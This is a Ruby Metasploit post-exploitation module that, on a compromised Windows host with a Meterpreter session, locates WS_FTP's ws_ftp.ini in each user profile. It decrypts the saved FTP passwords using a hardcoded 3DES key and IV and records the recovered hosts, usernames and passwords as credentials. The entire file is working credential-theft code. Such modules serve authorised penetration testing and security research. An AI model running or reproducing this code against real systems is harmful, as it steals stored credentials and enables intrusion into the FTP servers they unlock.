##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/parser/ini'
require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather WS_FTP Saved Password Extraction',
        'Description'   => %q{
          This module extracts weakly encrypted saved FTP Passwords
          from WS_FTP. It finds saved FTP connections in the ws_ftp.ini file.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'theLightCosine'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
  end

  def run
    print_status("Checking Default Locations...")
    grab_user_profiles().each do |user|
      next if user['AppData'] == nil
      check_appdata(user['AppData'] + "\\Ipswitch\\WS_FTP\\Sites\\ws_ftp.ini")
      check_appdata(user['AppData'] + "\\Ipswitch\\WS_FTP Home\\Sites\\ws_ftp.ini")
    end
  end

  def check_appdata(path)
    begin
      client.fs.file.stat(path)
      print_status("Found File at #{path}")
      get_ini(path)
    rescue
      print_status("#{path} not found ....")
    end
  end

  def get_ini(filename)
    config = client.fs.file.new(filename, 'r')
    parse = config.read
    ini = Rex::Parser::Ini.from_s(parse)

    ini.each_key do |group|
      next if group == "_config_"
      print_status("Processing Saved Session #{group}")
      host = ini[group]['HOST']
      host = host.delete "\""
      username = ini[group]['UID']
      username = username.delete "\""
      port = 	ini[group]['PORT']
      passwd = ini[group]['PWD']
      passwd = decrypt(passwd)

      next if passwd == nil or passwd == ""
      port = 21 if port == nil
      print_good("Host: #{host} Port: #{port} User: #{username}  Password: #{passwd}")
      service_data = {
        address: Rex::Socket.getaddress(host),
        port: port,
        protocol: "tcp",
        service_name: "ftp",
        workspace_id: myworkspace_id
      }

      credential_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: self.refname,
        username: username,
        private_data: passwd,
        private_type: :password
      }

      credential_core = create_credential(credential_data.merge(service_data))

      login_data = {
        core: credential_core,
        access_level: "User",
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      create_credential_login(login_data.merge(service_data))
    end
  end

  def decrypt(pwd)
    decoded = pwd.unpack("m*")[0]
    key = "\xE1\xF0\xC3\xD2\xA5\xB4\x87\x96\x69\x78\x4B\x5A\x2D\x3C\x0F\x1E\x34\x12\x78\x56\xab\x90\xef\xcd"
    iv = "\x34\x12\x78\x56\xab\x90\xef\xcd"
    des = OpenSSL::Cipher.new("des-ede3-cbc")

    des.decrypt
    des.key = key
    des.iv = iv
    result = des.update(decoded)
    final = result.split("\000")[0]
    return final
  end
end
